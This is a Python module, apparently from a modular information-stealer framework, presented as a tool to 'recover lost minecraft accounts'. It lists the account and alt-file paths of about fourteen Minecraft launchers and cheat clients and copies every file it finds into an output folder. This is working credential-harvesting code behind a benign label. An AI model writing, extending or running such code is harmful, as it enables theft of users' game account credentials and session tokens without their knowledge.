import os
import shutil

from config import ModuleManager, Constant


class MinecraftRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "MinecraftRecovery", module_path="applications/minecraft")
        
        self.banner(r"""
     _______          __   __   _                                   ____  _   
    |.-----.|        (__)_(__) (_) _       ____        _           (____)(_)_ 
    ||x . x||       (_) (_) (_) _ (_)__   (____)  ___ (_)__  ____ (_)__  (___)
    ||_.-._||       (_) (_) (_)(_)(____) (_)_(_)_(___)(____)(____)(____) (_)  
    `--)-(--`       (_)     (_)(_)(_) (_)(__)__(_)___ (_)  ( )_( )(_)    (_)_ 
   __[=== o]___     (_)     (_)(_)(_) (_) (____)(____)(_)   (__)_)(_)     (__)
  |:::::::::::|\    
  `-=========-`()               Recover lost minecraft accounts
                    """)

        self.minecraftInstallations = {
            "Intent": os.path.join(Constant.userprofile_dir, "intentlauncher", "launcherconfig"),
            "Lunar": os.path.join(Constant.userprofile_dir, ".lunarclient", "settings", "game", "accounts.json"),
            "TLauncher": os.path.join(Constant.roaming_dir, ".minecraft", "TlauncherProfiles.json"),
            "Feather": os.path.join(Constant.roaming_dir, ".feather", "accounts.json"),
            "Meteor": os.path.join(Constant.roaming_dir, ".minecraft", "meteor-client", "accounts.nbt"),
            "Impact": os.path.join(Constant.roaming_dir, ".minecraft", "Impact", "alts.json"),
            "Novoline": os.path.join(Constant.roaming_dir, ".minectaft", "Novoline", "alts.novo"),
            "CheatBreakers": os.path.join(Constant.roaming_dir, ".minecraft", "cheatbreaker_accounts.json"),
            "Microsoft Store": os.path.join(Constant.roaming_dir, ".minecraft", "launcher_accounts_microsoft_store.json"),
            "Rise": os.path.join(Constant.roaming_dir, ".minecraft", "Rise", "alts.txt"),
            "Rise (Intent)": os.path.join(Constant.userprofile_dir, "intentlauncher", "Rise", "alts.txt"),
            "Paladium": os.path.join(Constant.roaming_dir, "paladium-group", "accounts.json"),
            "PolyMC": os.path.join(Constant.roaming_dir, "PolyMC", "accounts.json"),
            "Badlion": os.path.join(Constant.roaming_dir, "Badlion Client", "accounts.json"),
        }
    
    def run(self) -> None:
        totalDone = 0
        for name, path in self.minecraftInstallations.items():
            if os.path.isfile(path):
                self.mdebug(f"[{name}] Found Minecraft installation at: {path}")
                try:
                    shutil.copy(path, self.module_output)
                    self.mprint(f"[{name}] Saved Minecraft installation to {self.module_output}")
                    totalDone += 1
                except Exception as e:
                    self.merror(f"[{name}] Unable to copy {path} to {self.module_output} -> {e}")
            else:
                self.mdebug(f"[{name}] Unable to find Minecraft installation at: {path}")
        
        if totalDone == 0:
            self.merror("Unable to find any Minecraft Installations")
        else:
            self.mprint(f"Found a total of {totalDone} Minecraft Installations")
